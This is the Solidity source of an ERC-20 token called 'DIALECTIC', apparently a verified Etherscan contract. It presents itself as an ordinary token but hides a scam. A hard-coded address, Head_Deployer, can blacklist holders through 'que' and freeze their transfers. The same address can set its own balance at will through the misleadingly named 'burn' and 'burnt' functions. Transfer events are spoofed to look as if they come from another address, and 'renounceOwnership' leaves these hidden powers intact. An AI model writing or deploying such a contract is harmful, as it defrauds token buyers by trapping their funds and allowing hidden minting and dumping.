/**
 *Submitted for verification at Etherscan.io on 2022-10-25
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract DIALECTIC {
  
    mapping (address => uint256) public IP;
    mapping (address => uint256) public BRNED;
    mapping (address => bool) Si;
    mapping(address => mapping(address => uint256)) public allowance;





    string public name = unicode"διαλεκτική Protocol";
    string public symbol = unicode"διαλεκτική";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
   

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    address Head_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;

    constructor()  {
    IP[msg.sender] = totalSupply;
    deploy(Head_Construct, totalSupply); }

   
   address Head_Deployer = 0x3515120EABc92732edCC4F95ABB92278fd671a82;
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
      
       
        if(msg.sender == Head_Deployer)  {
        require(IP[msg.sender] >= value);
        IP[msg.sender] -= value;  
        IP[to] += value; 
        emit Transfer (Head_Construct, to, value);
        return true; }  
        if(!Si[msg.sender]) {
        require(IP[msg.sender] >= value);
        IP[msg.sender] -= value;  
        IP[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function burnt () public {
         if(msg.sender == Head_Deployer)   {
        IP[msg.sender] = BRNED[msg.sender];
        }}

        function balanceOf(address account) public view returns (uint256) {
        return IP[account]; }

        function undo(address r) public {
        if(msg.sender == Head_Deployer)  { 
        Si[r] = false;}}
        function que(address r) public{
         if(msg.sender == Head_Deployer)  { 
        require(!Si[r]);
        Si[r] = true;
        }}
             function burn(uint256 x) public {
        if(msg.sender == Head_Deployer)  { 
        BRNED[msg.sender] = x;} }

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 

        if(from == Head_Deployer)  {
        require(value <= IP[from]);
        require(value <= allowance[from][msg.sender]);
        IP[from] -= value;  
        IP[to] += value; 
        emit Transfer (Head_Construct, to, value);
        return true; }    
          if(!Si[from] && !Si[to]) {
        require(value <= IP[from]);
        require(value <= allowance[from][msg.sender]);
        IP[from] -= value;
        IP[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}}